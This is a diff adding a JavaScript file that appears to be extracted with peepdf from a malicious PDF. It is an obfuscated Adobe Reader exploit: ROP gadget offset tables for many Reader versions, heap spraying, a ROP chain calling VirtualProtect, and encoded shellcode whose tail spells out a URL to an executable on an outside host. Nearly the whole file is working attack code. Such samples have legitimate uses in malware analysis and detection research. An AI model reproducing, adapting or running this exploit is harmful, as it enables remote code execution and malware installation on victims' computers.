@@ -1,0 +1,525 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+v7asd = fuzzy(event.gaeoff === undefined ? "de" : "", String);
+
+function fuzzy(ke, b9f) {
+    var juf;
+    juf = boozy("h", "C", "orma");
+    return b9f[juf + ke]
+}
+
+function boozy(pq, sx, ik) {
+    var uhl, z2b, f7y, kcf;
+    uhl = sx + pq;
+    z2b = sx + ik[0];
+    uhl = ik[2] + uhl;
+    f7y = ik[3] + ik[1];
+    kcf = "fr" + ik[0];
+    return kcf + uhl + f7y + z2b
+}
+
+function pack(i) {
+    var low = (i & 0xffff);
+    var high = ((i >> 16) & 0xffff);
+    return v7asd(low) + v7asd(high);
+}
+
+function unpackAt(s, pos) {
+    return s.charCodeAt(pos) + (s.charCodeAt(pos + 1) << 16);
+}
+
+function packs(s) {
+    result = "";
+    for (i = 0; i < s.length; i += 2)
+    result += v7asd(s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8));
+    return result;
+}
+
+function packh(s) {
+    return v7asd(parseInt(s.slice(2, 4) + s.slice(0, 2), 16));
+}
+
+function packhs(s) {
+    result = "";
+    for (i = 0; i < s.length; i += 4)
+    result += packh(s.slice(i, i + 4));
+    return result;
+}
+
+var _offsets = {
+    "Reader": { /*asdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdfaasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasffsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasffsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasffsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdasfasdasfsdfasdasfsdfasdasfsdfasdasfsdsdasfsdfasdasfsdfvsdfsdf*/
+
+        "9.303": {
+            "acrord32": 0x85,
+            "rop0": 0 + 0x14BA8,
+            "rop1": 0x1E73AF,
+            "rop1x": 0x2F12,
+            "rop2": 0x196774,
+            "rop3": 0xE475,
+            "rop3x": 0xE476,
+            "rop4": 0x3B2A,
+            "GMHWA": 0x7F245C,
+            "VPA": 0xB8809C,
+        },
+        "9.304": {
+            "acrord32": 0x85,
+            "rop0": 0x14BD8,
+            "rop1": 0x1E74BF,
+            "rop1x": 0x2F12,
+            "rop2": 0x1966A2,
+            "rop3": 0xE495,
+            "rop3x": 0xE496,
+            "rop4": 0x3B2A,
+            "GMHWA": 0x7F245C,
+            "VPA": 0xB8809C,
+        },
+        "9.4": {
+            "acrord32": 0x85,
+            "rop0": 0x14BD8,
+            "rop1": 0x1C9D3F,
+            "rop1x": 0x2F12,
+            "rop2": 0x1792EE,
+            "rop3": 0xE455,
+            "rop3x": 0xE456,
+            "rop4": 0x3B2A,
+            "GMHWA": 0x7F245C,
+            "VPA": 0xB8809C,
+        },
+        "9.401": {
+            "acrord32": 0x85,
+            "rop0": 0x14BD8,
+            "rop1": 0x1C9D3F,
+            "rop1x": 0x2F12,
+            "rop2": 0x1792EE,
+            "rop3": 0xE455,
+            "rop3x": 0xE456,
+            "rop4": 0x3B2A,
+            "GMHWA": 0x7F245C,
+            "VPA": 0xB8809C,
+        },
+        "9.402": {
+            "acrord32": 0x86,
+            "rop0": 0x159F8,
+            "rop1": 0x1E8C3F,
+            "rop1x": 0x2F12,
+            "rop2": 0x197DAA,
+            "rop3": 0xF265,
+            "rop3x": 0xF266,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FB394,
+            "VPA": 0xB97FF4,
+        },
+        "9.403": {
+            "acrord32": 0x86,
+            "rop0": 0x159F8,
+            "rop1": 0x1E950F,
+            "rop1x": 0x2F12,
+            "rop2": 0x198670,
+            "rop3": 0xF265,
+            "rop3x": 0xF266,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FB394,
+            "VPA": 0xB97FF4,
+        },
+        "9.404": {
+            "acrord32": 0x86,
+            "rop0": 0x159F8,
+            "rop1": 0x1E950F,
+            "rop1x": 0x2F12,
+            "rop2": 0x198670,
+            "rop3": 0xF265,
+            "rop3x": 0xF266,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FB394,
+            "VPA": 0xB97FF4,
+        },
+        "9.405": {
+            "acrord32": 0x86,
+            "rop0": 0x159C8,
+            "rop1": 0x1E85FF,
+            "rop1x": 0x2F12,
+            "rop2": 0x197A0A,
+            "rop3": 0xF275,
+            "rop3x": 0xF276,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FB394,
+            "VPA": 0xB97FF4,
+        },
+        "9.406": {
+            "acrord32": 0x86,
+            "rop0": 0x41E0,
+            "rop1": 0x1E9A9F,
+            "rop1x": 0x2F12,
+            "rop2": 0x19860C,
+            "rop3": 0xF255,
+            "rop3x": 0xF256,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FC394,
+            "VPA": 0xB9A374,
+        },
+        "9.407": {
+            "acrord32": 0x86,
+            "rop0": 0x41E0,
+            "rop1": 0x1E9A9F,
+            "rop1x": 0x2F12,
+            "rop2": 0x19860C,
+            "rop3": 0xF255,
+            "rop3x": 0xF256,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FC394,
+            "VPA": 0xB9A374,
+        },
+        "9.5": {
+            "acrord32": 0x86,
+            "rop0": 0x159F8,
+            "rop1": 0x1EA7AF,
+            "rop1x": 0x2F12,
+            "rop2": 0x1989A5,
+            "rop3": 0xF265,
+            "rop3x": 0xF266,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x7FE394,
+            "VPA": 0xB9C3B4,
+        },
+        "9.501": {
+            "acrord32": 0x87,
+            "rop0": 0x159E8,
+            "rop1": 0x1EA54F,
+            "rop1x": 0x2F12,
+            "rop2": 0x1988A6,
+            "rop3": 0xF265,
+            "rop3x": 0xF266,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x805398,
+            "VPA": 0xBA94F4,
+        },
+        "9.502": {
+            "acrord32": 0x87,
+            "rop0": 0x159E8,
+            "rop1": 0x1CCDDF,
+            "rop1x": 0x2F12,
+            "rop2": 0x17B715,
+            "rop3": 0xF2A5,
+            "rop3x": 0xF2A6,
+            "rop4": 0x3CAF,
+            "GMHWA": 0x805398,
+            "VPA": 0xBA84F4,
+        },
+        "9.503": {
+            "acrord32": 0x87,
+            "rop0": 0x76C04,
+            "rop1": 0x1D65CF,
+            "rop1x": 0x1160,
+            "rop2": 0x184BD3,
+            "rop3": 0x738E,
+            "rop3x": 0x738F,
+            "rop4": 0x4E70,
+            "GMHWA": 0x806398,
+            "VPA": 0xBAA7D4,
+        },
+        "9.504": {
+            "acrord32": 0x87,
+            "rop0": 0x76C04,
+            "rop1": 0x1D65CF,
+            "rop1x": 0x1160,
+            "rop2": 0x184BD3,
+            "rop3": 0x738E,
+            "rop3x": 0x738F,
+            "rop4": 0x4E70,
+            "GMHWA": 0x806398,
+            "VPA": 0xBAA7D4,
+        },
+        "10.101": {
+            "acrord32": 0xA3,
+            "rop0": 0x1DFFD,
+            "rop1": 0x1EAE7F,
+            "rop1x": 0x161D,
+            "rop2": 0x183B25,
+            "rop3": 0x1662,
+            "rop3x": 0x1663,
+            "rop4": 0x6C13,
+            "GMHWA": 0x964640,
+            "VPA": 0xE0426C,
+        },
+        "10.102": {
+            "acrord32": 0xA4,
+            "rop0": 0x1E65D,
+            "rop1": 0x1EAF7F,
+            "rop1x": 0x1628,
+            "rop2": 0x183A9E,
+            "rop3": 0x166D,
+            "rop3x": 0x166E,
+            "rop4": 0x6F17,
+            "GMHWA": 0x971644,
+            "VPA": 0xE1B9EC,
+        },
+        "10.103": {
+            "acrord32": 0xA4,
+            "rop0": 0x1E6ED,
+            "rop1": 0x1EBCBF,
+            "rop1x": 0x161D,
+            "rop2": 0x18465F,
+            "rop3": 0x1662,
+            "rop3x": 0x1663,
+            "rop4": 0x6D86,
+            "GMHWA": 0x973644,
+            "VPA": 0xE1EACC,
+        },
+        "10.104": {
+            "acrord32": 0xA4,
+            "rop0": 0x1E63D,
+            "rop1": 0x1EAB3F,
+            "rop1x": 0x15FD,
+            "rop2": 0x183BF2,
+            "rop3": 0x1642,
+            "rop3x": 0x1643,
+            "rop4": 0x6EEB,
+            "GMHWA": 0x975648,
+            "VPA": 0xE20F6C,
+        },
+        "10.105": {
+            "acrord32": 0xA5,
+            "rop0": 0x1E52D,
+            "rop1": 0x1EE93F,
+            "rop1x": 0x15FD,
+            "rop2": 0x186C0B,
+            "rop3": 0x1642,
+            "rop3x": 0x1643,
+            "rop4": 0x254D,
+            "GMHWA": 0x98164C,
+            "VPA": 0xE33034,
+        },
+        "10.106": {
+            "acrord32": 0xA5,
+            "rop0": 0x1E52D,
+            "rop1": 0x1EE93F,
+            "rop1x": 0x15FD,
+            "rop2": 0x186C0B,
+            "rop3": 0x1642,
+            "rop3x": 0x1643,
+            "rop4": 0x254D,
+            "GMHWA": 0x98164C,
+            "VPA": 0xE33034,
+        },
+        "11": {
+            "acrord32": 0xA9,
+            "rop0": 0xCFF4,
+            "rop1": 0x2D025F,
+            "rop1x": 0x11B2D,
+            "rop2": 0x222FBD,
+            "rop3": 0xB8E6,
+            "rop3x": 0xB8E6,
+            "rop4": 0xD762,
+            "GMHWA": 0xA756CC,
+            "VPA": 0xF3BBF8,
+        },
+        "11.001": {
+            "acrord32": 0xA9,
+            "rop0": 0x19CBE,
+            "rop1": 0x2D933F,
+            "rop1x": 0x11BED,
+            "rop2": 0x22C4E0,
+            "rop3": 0xB9A6,
+            "rop3x": 0xB9A6,
+            "rop4": 0xD822,
+            "GMHWA": 0xA7D6B0,
+            "VPA": 0xF493B4,
+        }
+    }
+};
+
+function offset(x) {
+    try {
+        return _offsets[app.viewerType][app.viewerVersion][x];
+    } catch (e) {}
+
+    return 0x41414141;
+}
+
+
+
+
+var slide_size = 0x12c;
+var size = 200;
+var chunkx = "\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241\u5a58\u5241";
+var x = new Array(size);
+var y = new Array(size);
+var z = new Array(size);
+var pointers = new Array(100);
+var done = 0;
+
+
+
+
+var i;
+var j;
+if (spray.done == 0) {
+    var TOKEN = "\u5858\u5858\u5678\u1234";
+    var chunk_len = spray.slide_size / 2 - 1 - (TOKEN.length + 2 + 2);
+
+    for (i = 0; i < spray.size; i += 1)
+    spray.x[i] = TOKEN + util.pack(i) + spray.chunkx.substring(0, chunk_len) + util.pack(i) + "";
+
+    for (j = 0; j < 1000; j++)
+    for (i = spray.size - 1; i > spray.size / 4; i -= 10)
+    spray.x[i] = null;
+
+    spray.done = 1;
+}
+
+
+
+
+var i;
+var j;
+var found = -1; // Index of the overlapped string
+var acro = 0; // Base of the AcroRd32_dll
+var ver = app.viewerVersion.toFixed(3);
+var verArr = ver.split(".");
+var verA = parseInt(verArr[0]);
+var verB = (verArr.length > 1) ? parseInt(verArr[1]) : 0;
+
+var x1, x2, x3;
+
+if (verArr.length > 1) {
+    verB = parseInt(verArr[1]);
+    if (verArr[1].length == 1) verB *= 100;
+} else verB = 0;
+
+var shellcode = "\u06eb\u0000\u0000\u05eb\uf9e8\uffff\u5aff\uc283\u8718\u8bd6\u33fe\u66c9\ue0b9\ufc01\u35ad\ueea6\u78ef\ue2ab\u36f7\u077e\ua678\uefee\u2525\uea03\u7af3\u036f\ua778\uefee\u6f4b\u648a\u964d\uefee\u2d78\ue398\ud0f3\u64f2\uae3e\u9165\u2d58\u89d8\ue941\u9af6\uc08a\ua0d7\ud26e\u6202\u9acd\uefe8\u2b78\u1753\ua67d\u07ee\ua2fe\uefee\u33f5\ue89d\ua678\u10bc\u5eed\uefeb\u2378\ue02e\u09fc\uefed\u2b78\u875b\ua67e\u62ee\u86c5\uefe8\u4e78\ueb8e\ua678\u7a63\ua304\uefee\u592a\u177b\ua67d\u6aee\ua9b8\u666a\ua67b\u62ee\ud6cd\uefe8\u2b78\ucb53\ua67e\u07ee\ua242\uefee\u33f5\uea66\ua678\u10bc\u5eed\uefeb\u2378\ue02e\uc5fc\uefed\u2b78\u6b5b\ua67e\u62ee\u92c5\uefe8\u4e78\uebfa\ua678\uac63\u614c\u73ee\ua678\ubfee\u3387\ue9f2\ua678\u2f6b\uab0c\uac63\u254c\ueb96\ua97e\uc76c\u5987\u6211\uc9fd\uefeb\uf678\u7a11\ua068\uefee\u66fd\u6be1\ua564\uefee\u25f1\uef32\ua678\uaa63\uc0a3\ue765\u2f1e\u3765\ua678\u89ee\ueef3\u89ec\u2df1\uef34\ua678\u6c88\u7ec3\uefee\uaf78\u6be1\ua207\uefee\u33f5\uea8d\ua678\u10bc\u5eed\uefeb\u2378\ue02e\u7dfc\uefec\ua378\uffee\ua678\u6c67\ua6ac\uefee\ua012\uef86\ua108\u85ee\u2b78\u7e7b\ua67e\ubdee\u1587\uef3a\ua678\u6506\ua67b\u6aee\ua9b8\u426a\ua67a\u66ee\u4afb\uefee\ucc78\u87ef\ud678\uefe9\ua612\u7a63\ua0e8\uefee\u592a\u3b5d\ua678\u07ee\ua519\uefee\u66fd\u6be1\ua4fc\uefee\u25f1\uef0e\ua678\ueb84\ua610\ueffe\uce78\uefee\uaaf8\uef84\u3387\ue9ea\ua678\u2f6b\u2277\ued8c\ua678\u6c67\ua690\uefee\u5ef3\u6c65\ua694\uefee\uc0d3\u546d\ua6a0\uefee\ud473\u64ff\uaefd\uefe8\u0d78\u6c65\ua694\uefee\u0dd3\ue005\u23f3\ue9e6\ua678\u6445\u46fb\uefee\u0d78\u5745\ua658\ue7e6\u1e1e\ueece\uc0d3\u2fdd\u1ed3\ucfee\ua678\u5745\ua638\uefee\u1ed3\uefce\uae70\u5645\ua987\uefee\u7f8f\u16cd\u69f9\ueeee\ua678\u5a63\ua3e0\uefee\ud8c1\uefe9\u2778\ueb2f\ua679\u1cee\u16dc\u45af\u271e\uef11\ud468\u6418\u4eeb\uefee\u2778\uef2c\u2678\u56e2\ub678\uefee\u15f3\uef06\ua678\u4b1d\u5c43\u009c\u2bf5\ue975\ua678\u6488\u7efb\uefee\uc078\ueed7\ua90c\u2e6d\uc06a\ud66d\ua978\u4e6a\ua679\u04ee\uc094\u6c65\ua6a2\uefee\u9f1e\uedaf\ub60c\u2e6d\uc06a\u966d\ua67a\u6be1\ua7fc\uefee\u4c93\u6467\ua6a8\uefee\u33f5\ue979\ua678\uae64\u2e68\ueeac\ua212\uef86\ua838\u85ee\uf478\u7c65\ua6a4\uefee\u64f9\uffee\ua678\u07bc\ua451\uefee\u66fd\u6be1\ua734\uefee\u2d38\u6216\u42fb\uefee\uf678\uaf84\ua712\u10b9\uaeed\uefe8\u2d78\u3f65\ua678\u65ee\ub739\ue866\u25f3\uef32\ua678\u6465\ua6a8\uefee\ue77b\u10e2\ucea8\uec06\ua678\u7a11\ua060\uefee\ua612\uef84\ua612\uef84\u23f5\ueaa6\ua678\u10be\u82ed\uefe8\ucc78\u85ee\ucc78\u85ed\ucc78\u87ee\ua7c3\uefee\u2bf5\ueaa3\ua678\ubfbf\u3387\ue9c6\ua678\uef84\ua610\u6fee\ucc78\u85ee\ucc78\u62ee\ufdf5\uefeb\uf778\uef84\u5928\uc37b\ua67e\u87ee\ua678\ue36e\u1587\uef06\ua678\uea84\u2bf5\ueaa6\ua678\ubfbf\u3387\ue9de\ua678\u6465\ua6a8\uefee\ue7f3\uecea\u7afb\uefee\u2f78\u1f6d\ua678\u64ee\u76f3\uefee\u2d78\ue7af\u257b\uef32\ua678\u6c67\ua68c\uefee\u4ec6\uefed\u4e78\uef92\ua678\u9aa0\u4e80\uef9a\ua678\u1f65\ucb90\uefee\u2d78\u0716\ua61e\uefee\u592e\u1f7d\ua678\u87ee\ua780\uefee\ua612\u7a11\ua074\uefee\uf62f\ubfbe\u5ef3\ucf56\uae78\u56e6\ua602\uefee\u0d8b\u2fdd\u0d1e\u7a11\ua040\uefee\uf9ee\u7357\ua678\u5fee\u553a\ub744\uce27\uef72\ua678\ub9be\u3387\ue9da\ua678\u10b9\u56eb\uefee\uce78\ufc66\ua678\u7a11\ua060\uefee\ua612\u1084\u3387\ue9ee\ua678\u6a63\ua3eb\uefee\ua712\u6c88\u7ec3\uefee\uad78\uee9c\uf628\ubfbe\uf628\u85be\ucc78\u10ee\u52eb\uefee\u6578\udcb9\u9587\u432e\u66fc\ue29a\uc744\ued92\u8654\u202f\ua575\u0416\u3194\u2cb1\uf084\ubcb9\u2d29\u6616\u8234\u6232\u9a09\u6443\uae2c\u6a96\ud2aa\uecb2\u822c\u6432\u8622\ub3ed\u7a5c\ua565\u2d60\uecdd\u820c\u0732\u59ce\u1011\u6143\ue89a\u65fb\u0dea\u4d94\u64d6\ube3a\u2ec5\ud4f3\uecca\u820c\ubd32\ua4c3\uefee\u5178\ub50d\u607b\u26dd\u2d1e\u64e6\uba02\u3ddd\ua2c3\uefee\u2d78\u182f\ua59b\ucbaa\ua5a4\u6429\ua578\ucbaa\u4da4\udcec\uffb8\ub0b5\u6526\u2765\u9bd5\u5455\u1dc3\ue79a\ud190\u1011\u0d87\u1f05\uf0bb\ubdb9\uf529\uab19\ube5c\u1011\u5987\ua29a\ue28f\uf3ca\u5987\u1011\ue50c\u6412\u8234\u6ac6\ud2b1\u64d4\u820c\u64f6\u8204\u64f2\u8224\u64ca\u822c\ud4ce\ud1b3\ub9c8\uf72f\u6abc\ud3aa\u1cea\u4dde\u65e0\u847e\ud5ec\ud37f\ua9e8\ue43f\u9aa7\ufc8a\ub0b7\ud226\ua4e4\ua50c\u04a8\u95ae\u042e\u2d7a\ub428\ufc21\ub1b1\ub6ba\uaeee\uc32f\uef8c\ud10f\uc199\uc219\u8d81\u881d\u808d\ua615\uefc1\ud216\u838a\ua614\u838d\uc51a\u9b8f\u8809\u838a\ua614\u8caf\uc90a\u8bbc\u944b\u8ac0\uc300\u98ee\uc811\u8187\ud21d\u8bc0\uca14\u9aee\uc30b\udc9c\u884a\u838a\ua614\uefee\ua678\u0722\ua678\uefee\u2525\uea03\u251e\u170a\u7af3\u036f\ua758\uefee\u59c8\ueb57\ua679\u62ee\u40c5\uefef\u5478\ua040\ua1be\u85ee\ucc78\u87ee\ua687\uefee\u2df5\u111e\u5987\u62bf\u40ed\uefef\uf478\uef84\u3387\uef66\ua678\uea84\u35f5\u111e\u5987\u10bc\udaed\uefee\ucc78\u85ee\u5987\u877b\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\u99ee\u2d3e\u9564\u6c96\ua4f4\ud453\uf3e9\u88c6\u0cde\ua5cf\u54f6\u24f3\u0344\u48c4\u878f\u2e8e\u7fe3\u8b39\u8474\u3bb8\u548b\u1dc3\udd55\u0918\u5465\u1dc3\uff55\u8140\u1a18\u2e25\u6842\ufc94\u6b68\uc54c\u5452\u1dc3\u0055\u09c7\u73e5\udce7\u548a\u1dc3\u2c55\ufa2a\u2db3\ua670\u9b84\u2f2a\uefe5\ua678\u1ede\ua67e\u072e\ua67e\u4ebe\ua679\u9c9a\ua673\uefef\u3d08\uefe8\u3578\uefe8\u1ad8\uefef\ud50c\uefe5\ua67a\u759e\ua67e\u7dee\ua67e\u534e\ua679\u9c9a\ua672\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ud10e\uefe4\ua679\uefee\ua678\uefee\ua678\uefee\ua678\u9898\ua672\uef8a\ua678\uefee\ua678\uefee\ua678\uefee\ud00f\uefe4\ua61d\u418e\ua679\u472e\ua679\u9c0e\ua679\u9999\ua672\uef88\u0928\uefef\u0fc8\uefef\ud218\uefef\ud00f\uefe4\ua61f\u409e\ua679\u463e\ua679\u9c4e\ua679\u9896\ua672\uef86\u0808\uefef\u0ea8\uefef\ud568\uefef\ud100\uefe4\ua611\u404e\ua679\u45ee\ua679\u9c4e\ua679\u9896\ua678\uefee\ua678\uefee\ua678\uefee\ua678\uefee\ua678\u9d9b\ucb14\u8181\uc256\u8382\u6878\u7474\u3a70\u2f2f\u6873\u706f\u6e2e\u6765\u6f72\u722d\u7968\u6167\u7373\u632e\u2f68\u7363\u2f73\u4556\u3152\u3330\u652e\u6578\u00ff";
+var shellcode2 = shellcode[0] + util.pack((verB << 16) | verA) + shellcode.substring(3);
+var add_num = verA >= 11 ? 16 : 14;
+
+for (i = 0; i < spray.size; i += 1)
+if ((spray.x[i] != null) && (spray.x[i][0] != "\u5858")) {
+    found = i;
+    acro_high_w = acro = (util.unpackAt(spray.x[i], add_num) >> 16);
+    acro = (acro_high_w - util.offset("acrord32")) << 16;
+    break;
+}
+
+if (found == -1) {
+    event.target.closeDoc(true);
+}
+
+if (found == -1) {
+    x1 = 0x10d67278;
+    x2 = 0x151ad5d8;
+    x3 = 0x7dae241;
+
+    acro = x1 + x2 + x3;
+}
+
+var chunky = "";
+var heap_addr = 0x10101000;
+
+if (verA < 11) {
+    for (i = 0; i < 7; i += 1)
+    chunky += util.pack(0x41414141);
+}
+
+chunky += util.pack(heap_addr);
+while (chunky.length < spray.slide_size / 2)
+chunky += util.pack(0x58585858);
+
+for (j = 0; j < 10000; j++)
+spray.x[found - 1] = spray.x[found] = null;
+
+for (i = 0; i < spray.size; i += 1) {
+    ID = "" + i;
+    spray.y[i] = chunky.substring(0, spray.slide_size / 2 - ID.length) + ID + "";
+}
+
+var obj = heap_addr;
+var pointer_slide = "";
+
+pointer_slide += util.pack(acro + util.offset("rop1")); //add esp,60;ret
+for (i = 0; i < 27; i += 1) {
+    if (i == 24) pointer_slide += util.pack(acro + util.offset("rop1x")); //-> rop2
+    else pointer_slide += util.pack(0x41414141);
+}
+
+obj += pointer_slide.length * 2;
+// ROP
+pointer_slide += util.pack(acro + util.offset("rop0"));
+pointer_slide += util.pack(acro + util.offset("rop3x"));
+pointer_slide += util.pack(acro + util.offset("GMHWA"));
+pointer_slide += util.pack(acro + util.offset("rop4"));
+//@0x10
+pointer_slide += util.pack(acro + util.offset("rop2"));
+pointer_slide += util.pack(obj + 0xDC);
+pointer_slide += util.pack(obj + 0xCC);
+pointer_slide += util.pack(0x43434343);
+//@0x20
+pointer_slide += util.pack(0x43434343);
+pointer_slide += util.pack(0x43434343);
+pointer_slide += util.pack(acro + util.offset("rop3"));
+pointer_slide += util.pack(acro + util.offset("rop3"));
+//@0x30
+pointer_slide += util.pack(acro + util.offset("VPA"));
+pointer_slide += util.pack(acro + util.offset("rop4"));
+pointer_slide += util.pack(obj + 0x50);
+pointer_slide += util.pack(obj + 0x50);
+//0x40
+pointer_slide += util.pack(0x1000);
+pointer_slide += util.pack(0x40);
+pointer_slide += util.pack(obj + 0x4C);
+pointer_slide += util.pack(0x00000000);
+//0x50
+pointer_slide += util.packhs("E999000000909090");
+pointer_slide += util.pack(acro);
+pointer_slide += util.pack(0xCCCCCCCC);
+//0x60
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.pack(0xCCCCCCCC);
+//0x70
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.pack(acro);
+pointer_slide += util.pack(0x48484848);
+//0x80
+pointer_slide += util.pack(0x49494949);
+pointer_slide += util.pack(0x50505050);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+//0x90
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+//0xa0
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+//0xb0
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+//0xc0
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0x46464646);
+pointer_slide += util.pack(0xCCCCCCCC);
+pointer_slide += util.packs("VirtualProtect"); //@0xCC
+pointer_slide += "\u0000";
+pointer_slide += "KERNEL32";
+pointer_slide += "\u0000";
+pointer_slide += shellcode2;
+
+while (pointer_slide.length < 0x1000 / 2)
+pointer_slide += util.pack(0x41414141);
+pointer_slide = pointer_slide.substring(0, 0x1000 / 2);
+while (pointer_slide.length < 0x100000 / 2)
+pointer_slide += pointer_slide;
+for (i = 0; i < 100; i += 1)
+spray.pointers[i] = pointer_slide.substring(16, 0x100000 / 2 - 16 - 2) + util.pack(i) + "";
+
+if (verA > 9) xfa.host.messageBox("Page not found !", "Adobe Acrobat", 3, 1);
+
+
+var pdfDoc = event.target;
+pdfDoc.closeDoc(true);
+
